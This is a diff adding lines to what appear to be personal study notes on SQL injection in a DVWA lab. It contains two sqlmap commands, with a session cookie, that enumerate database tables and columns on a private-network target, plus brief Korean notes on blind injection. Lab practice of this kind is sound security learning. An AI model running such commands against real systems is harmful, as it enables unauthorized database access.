@@ -323,3 +323,16 @@ impossible
 ![[Pasted image 20241008141111.png]]
 
 ![[Pasted image 20241008141157.png]]
+
+`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D information_schema --tables`
+![[Pasted image 20241008141855.png]]
+
+`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D information_schema -T tables --col`
+![[Pasted image 20241008142128.png]]
+
+# Blind
+![[Pasted image 20241008141423.png]]
+![[Pasted image 20241008141445.png]]
+- 문법에 대한 오류가 표시되지 않는다.
+- 경우의 수를 전부 넣어 봐야 한다.
+
